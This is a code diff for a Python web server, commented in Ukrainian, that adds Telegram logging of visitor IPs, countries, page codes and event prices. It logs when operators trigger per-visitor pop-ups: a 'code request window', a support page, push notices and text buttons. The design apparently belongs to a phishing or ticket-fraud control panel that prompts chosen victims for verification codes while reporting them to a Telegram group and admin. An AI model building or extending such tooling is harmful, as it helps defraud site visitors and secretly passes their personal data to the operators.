@@ -183,6 +183,9 @@ def send_telegram_log_async(page, link, ip, country=None, extra_user_id=None, im
                 )
                 # Надсилаємо event creator
                 send_telegram_message_to_user(extra_user_id, message)
+                
+                # Додатково логуємо в консоль
+                print(f"[DEBUG] Event creator log: {message}")
             else:
                 # Надсилаємо в групу тільки важливі повідомлення
                 if important:
@@ -193,6 +196,15 @@ def send_telegram_log_async(page, link, ip, country=None, extra_user_id=None, im
                         f"🏳️ Країна: {country}"
                     )
                     send_telegram_message_to_group(message)
+                    
+                    # Також надсилаємо головному адміну
+                    try:
+                        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+                        data_admin = {"chat_id": ADMIN_ID, "text": message}
+                        requests.post(url, data=data_admin, timeout=1)
+                        print(f"📤 Важливий лог надіслано головному адміну")
+                    except Exception as e:
+                        print(f"❌ Помилка надсилання головному адміну: {e}")
         except Exception as e:
             print(f"[Telegram Log Error] {e}")
     
@@ -403,6 +415,43 @@ def send_telegram_log(page, link, ip, country="", extra_user_id=None, important=
     except Exception as e:
         print(f"❌ Не вдалося надіслати лог у Telegram: {e}")
 
+# Додаємо функцію для логування кнопок в чат
+def send_button_log_to_chat(button_type, ip, page_code, user_name=None, event_info=None):
+    """
+    Надсилає лог про кнопку в чат з кнопками
+    """
+    try:
+        # Формуємо повідомлення про кнопку
+        if button_type == 'push':
+            msg = f"🔔 Push-повідомлення з'явилося на сайті\n\n"
+        elif button_type == 'code':
+            msg = f"🔔 Вікно запиту коду з'явилося на сайті\n\n"
+        elif button_type == 'support':
+            msg = f"🔔 Сторінка техпідтримки завантажена на сайті\n\n"
+        elif button_type == 'text':
+            msg = f"🔔 Кнопка з текстом з'явилася на сайті\n\n"
+        else:
+            msg = f"🔔 Кнопка {button_type} з'явилася на сайті\n\n"
+        
+        if user_name:
+            msg += f"👤 Користувач: {user_name}\n"
+        if ip:
+            msg += f"📶 IP: {ip}\n"
+        if page_code:
+            msg += f"#️⃣ Сторінка: {page_code}\n"
+        if event_info:
+            msg += f"💰 Сума: {event_info.get('price', 'N/A')} {event_info.get('currency', '')}\n"
+        
+        # Надсилаємо в чат з кнопками
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+        data_chat = {"chat_id": GROUP_ID, "text": msg}
+        
+        requests.post(url, data=data_chat, timeout=1)
+        print(f"📤 Лог про кнопку {button_type} надіслано в чат")
+        
+    except Exception as e:
+        print(f"❌ Помилка надсилання логу про кнопку: {e}")
+
 def get_real_ip(handler):
     xff = handler.headers.get('X-Forwarded-For')
     if xff:
@@ -596,8 +645,10 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
         
         # Логуємо для event creator ТІЛЬКИ якщо це сторінка з його page_code
         if extra_user_id and not is_telegram and should_log and page_code:
+            print(f"[DEBUG] Логуємо для event creator: extra_user_id={extra_user_id}, is_telegram={is_telegram}, should_log={should_log}, page_code={page_code}")
             # Отримуємо країну за IP
             country = get_country_by_ip(ip)
+            print(f"[DEBUG] Надсилаємо лог event creator: {norm_path}, IP: {ip}, країна: {country}, user_id: {extra_user_id}")
             # Non-blocking log
             send_telegram_log_async(
                 page=norm_path,
@@ -617,12 +668,14 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
         
         # Група та адмін — логуємо тільки реальні сторінки та не Telegram, АЛЕ НЕ якщо це вже залоговано для event creator
         if should_log and not should_ignore_first_visit and not is_telegram and not extra_user_id:
+            print(f"[DEBUG] Логуємо в групу: should_log={should_log}, should_ignore_first_visit={should_ignore_first_visit}, is_telegram={is_telegram}, extra_user_id={extra_user_id}")
             if not hasattr(self.server, 'logged_paths'):
                 self.server.logged_paths = set()
             if norm_path not in self.server.logged_paths:
                 self.server.logged_paths.add(norm_path)
                 # Отримуємо країну за IP
                 country = get_country_by_ip(ip)
+                print(f"[DEBUG] Надсилаємо лог в групу: {norm_path}, IP: {ip}, країна: {country}")
                 # Non-blocking log - тільки важливі повідомлення
                 send_telegram_log_async(
                     page=norm_path,
@@ -1086,6 +1139,16 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
                 elif action == 'code' and ip:
                     CODE_REDIRECT_FLAGS[ip] = True
                     print(f'[admin_action] Code redirect for IP: {ip}')
+                    
+                    # Логуємо появу code кнопки в чат
+                    try:
+                        # Отримуємо page_code та інформацію про подію
+                        page_code = data.get('page_code', '')
+                        event_info = get_event_info_by_page_code(page_code) if page_code else None
+                        send_button_log_to_chat('code', ip, page_code, None, event_info)
+                    except Exception as e:
+                        print(f"[admin_action] Error logging button: {e}")
+                    
                 self.send_response(200)
                 self.end_headers()
                 self.wfile.write(b'ok')
@@ -1136,9 +1199,29 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
                 if ip and flag_type == 'support':
                     SUPPORT_FLAGS[ip] = {'support': True, 'used': False}
                     print(f"[set_support_flag] Встановлено support флаг ТІЛЬКИ для IP: {ip}")
+                    
+                    # Логуємо появу support кнопки в чат
+                    try:
+                        # Отримуємо page_code та інформацію про подію
+                        page_code = data.get('page_code', '')
+                        event_info = get_event_info_by_page_code(page_code) if page_code else None
+                        send_button_log_to_chat('support', ip, page_code, None, event_info)
+                    except Exception as e:
+                        print(f"[set_support_flag] Error logging button: {e}")
+                    
                 elif ip and flag_type == 'text' and text_id:
                     SUPPORT_FLAGS[ip] = {'text_id': text_id, 'used': False}
                     print(f"[set_support_flag] Встановлено text флаг ТІЛЬКИ для IP: {ip} з text_id: {text_id}")
+                    
+                    # Логуємо появу text кнопки в чат
+                    try:
+                        # Отримуємо page_code та інформацію про подію
+                        page_code = data.get('page_code', '')
+                        event_info = get_event_info_by_page_code(page_code) if page_code else None
+                        send_button_log_to_chat('text', ip, page_code, None, event_info)
+                    except Exception as e:
+                        print(f"[set_support_flag] Error logging button: {e}")
+                    
                 self.send_response(200)
                 self.end_headers()
                 self.wfile.write(b'ok')
@@ -1210,6 +1293,16 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
                     
                     PUSH_FLAGS[page_code] = {'used': False}
                     print(f'[set_push_flag] Встановлено push флаг ТІЛЬКИ для page_code: {page_code}')
+                    
+                    # Логуємо появу push кнопки в чат
+                    try:
+                        # Отримуємо IP та інформацію про подію
+                        ip = get_real_ip(self)
+                        event_info = get_event_info_by_page_code(page_code)
+                        send_button_log_to_chat('push', ip, page_code, None, event_info)
+                    except Exception as e:
+                        print(f"[set_push_flag] Error logging button: {e}")
+                    
                     self.send_response(200)
                     self.end_headers()
                     self.wfile.write(b'ok')
